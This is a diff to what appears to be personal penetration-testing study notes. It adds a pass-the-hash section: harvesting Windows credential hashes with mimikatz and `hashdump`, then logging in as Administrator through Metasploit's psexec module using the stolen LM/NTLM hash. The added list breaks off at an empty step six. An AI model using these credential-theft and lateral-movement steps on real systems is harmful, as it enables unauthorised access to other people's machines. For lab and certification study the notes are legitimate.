@@ -255,3 +255,18 @@ INFO: this also exploit the rejetto 2.3 version as UAC with UACME
 14. Display logon passwords `sekurlsa::logonpasswords`
 
 ### Pass-The-Hash Attack
+
+DO MIMIKATZ FIRST!
+
+- After optaining hashes
+- Exploitation technique
+- Tools: Metasploit PsExec module and Crackmapexec
+- after attack will optain access to the target system via legitimate credentials as opposed to acces via service exploitation
+
+1. From previously mimikatz dump, DO THAT FIRST!!
+2. create a text file from dump from admins and users: copy the "Hash NTLM" and LM hash from step 3
+3. `hashdump`, then copy see picture
+   ![alt text](/assets/hash_dump.png)
+4. background session: `search psexec` look for exploit/windows/smb/psexec
+5. set options: check LPORT and maybe cahnge -> `set RHOSTS` -> `set SMBUSER Administrator` -> `set SMBPASS LM&NTLMHASH` <--- see picture for hash copied -> `set target Command` OR `set target Native\ upload` -> exploit
+6.
